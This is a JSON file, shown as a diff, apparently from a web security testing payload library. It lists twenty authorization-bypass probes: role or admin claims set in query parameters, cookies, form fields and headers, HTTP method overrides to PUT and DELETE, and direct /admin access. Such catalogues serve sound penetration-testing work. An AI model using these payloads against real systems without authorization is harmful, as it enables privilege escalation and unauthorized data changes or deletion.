@@ -1,0 +1,350 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "authz"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "032f587e41088255",
+      "payload": "admin=1",
+      "technique": "role_differential",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Query parameter admin integer flag. Append admin=1 to test if numeric admin flag is trusted.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "numeric",
+        "query"
+      ]
+    },
+    {
+      "id": "1aac65a423011cf2",
+      "payload": "user_type=administrator",
+      "technique": "role_differential",
+      "injection_surface": "cookie",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Cookie-based user type escalation. Set user_type=administrator cookie to test if user type is trusted from cookies.",
+      "source": "ensphere",
+      "tags": [
+        "administrator",
+        "cookie",
+        "user_type"
+      ]
+    },
+    {
+      "id": "3093c375d5ee32db",
+      "payload": "X-Method-Override: PUT",
+      "technique": "method_override",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Alternative method override header. Test X-Method-Override (without HTTP prefix) for method-based bypass.",
+      "source": "ensphere",
+      "tags": [
+        "header",
+        "method_override",
+        "put"
+      ]
+    },
+    {
+      "id": "465d7c01ed96c3b7",
+      "payload": "access_level=admin\u0026permissions=all",
+      "technique": "role_differential",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Form body access level escalation. Submit access_level and permissions fields to test authorization bypass.",
+      "source": "ensphere",
+      "tags": [
+        "access_level",
+        "form",
+        "permissions"
+      ]
+    },
+    {
+      "id": "4bc633cc3d3f4b5d",
+      "payload": "access_level=admin",
+      "technique": "role_differential",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Query parameter access level override. Append access_level=admin to test if access level is user-controllable.",
+      "source": "ensphere",
+      "tags": [
+        "access_level",
+        "query",
+        "tampering"
+      ]
+    },
+    {
+      "id": "56b6fbddc5687162",
+      "payload": "X-Role: admin",
+      "technique": "role_differential",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Header-based role override. Add X-Role header to test if backend trusts client-supplied role claims without server-side validation.",
+      "source": "ensphere",
+      "tags": [
+        "escalation",
+        "header",
+        "role"
+      ]
+    },
+    {
+      "id": "5b808c28c908ab40",
+      "payload": "_method=PUT",
+      "technique": "method_override",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Query parameter method override to PUT. Test if _method query parameter overrides HTTP method for frameworks supporting method spoofing.",
+      "source": "ensphere",
+      "tags": [
+        "method_override",
+        "put",
+        "query"
+      ]
+    },
+    {
+      "id": "61bd6038cbbe8115",
+      "payload": "X-HTTP-Method-Override: DELETE",
+      "technique": "method_override",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "HTTP method override to DELETE via header. Test if X-HTTP-Method-Override header bypasses method-based access controls.",
+      "source": "ensphere",
+      "tags": [
+        "delete",
+        "header",
+        "method_override"
+      ]
+    },
+    {
+      "id": "6291864601e8fe6b",
+      "payload": "/admin",
+      "technique": "role_differential",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Direct admin path access. Test if /admin endpoint is accessible without proper authorization.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "direct_access",
+        "path"
+      ]
+    },
+    {
+      "id": "63a826c58d67f5a7",
+      "payload": "_method=DELETE",
+      "technique": "method_override",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Form body method override to DELETE. Test if _method in form body bypasses DELETE restrictions.",
+      "source": "ensphere",
+      "tags": [
+        "delete",
+        "form",
+        "method_override"
+      ]
+    },
+    {
+      "id": "645d288f21f014d9",
+      "payload": "role=admin",
+      "technique": "role_differential",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Query parameter role override. Append role=admin to test if authorization is derived from user-controlled query parameters.",
+      "source": "ensphere",
+      "tags": [
+        "query",
+        "role",
+        "tampering"
+      ]
+    },
+    {
+      "id": "7e8c9bc6543d84fe",
+      "payload": "role=admin",
+      "technique": "role_differential",
+      "injection_surface": "cookie",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Cookie-based role escalation. Set role=admin cookie to test if authorization is derived from client-side cookie values.",
+      "source": "ensphere",
+      "tags": [
+        "cookie",
+        "escalation",
+        "role"
+      ]
+    },
+    {
+      "id": "84fab6b1fb2f80c9",
+      "payload": "role=admin\u0026is_admin=true",
+      "technique": "role_differential",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Form body role escalation. Submit role and is_admin fields in form body to test mass assignment.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "form",
+        "role"
+      ]
+    },
+    {
+      "id": "8616a6d5599938d4",
+      "payload": "X-Auth-User: admin",
+      "technique": "role_differential",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Auth user header override. Test if X-Auth-User header bypasses authentication checks.",
+      "source": "ensphere",
+      "tags": [
+        "auth",
+        "header",
+        "user"
+      ]
+    },
+    {
+      "id": "92d4b003de092ce5",
+      "payload": "X-Admin: true",
+      "technique": "role_differential",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Header-based admin flag. Add X-Admin header to test if backend grants admin access via trusted header.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "flag",
+        "header"
+      ]
+    },
+    {
+      "id": "9ddd9561fb8d30e0",
+      "payload": "X-Forwarded-User: admin",
+      "technique": "role_differential",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Forwarded user header injection. Test if reverse proxy X-Forwarded-User header is trusted without validation.",
+      "source": "ensphere",
+      "tags": [
+        "forwarded",
+        "header",
+        "proxy"
+      ]
+    },
+    {
+      "id": "a167bfcde54f6102",
+      "payload": "X-Original-User: admin",
+      "technique": "role_differential",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Original user header injection. Test if X-Original-User header from upstream proxy is trusted.",
+      "source": "ensphere",
+      "tags": [
+        "header",
+        "original",
+        "proxy"
+      ]
+    },
+    {
+      "id": "abb4dfd3a8102443",
+      "payload": "is_admin=true",
+      "technique": "role_differential",
+      "injection_surface": "cookie",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Cookie-based admin flag. Set is_admin=true cookie to test if admin access is controlled by client-side cookie.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "boolean",
+        "cookie"
+      ]
+    },
+    {
+      "id": "bb8683719e0a49c3",
+      "payload": "X-User-Role: administrator",
+      "technique": "role_differential",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Header-based user role override. Test if X-User-Role header is trusted by backend authorization logic.",
+      "source": "ensphere",
+      "tags": [
+        "administrator",
+        "header",
+        "role"
+      ]
+    },
+    {
+      "id": "ca3748d70df7e367",
+      "payload": "_method=DELETE",
+      "technique": "method_override",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Query parameter method override to DELETE. Test if _method query parameter bypasses DELETE restrictions.",
+      "source": "ensphere",
+      "tags": [
+        "delete",
+        "method_override",
+        "query"
+      ]
+    }
+  ]
+}
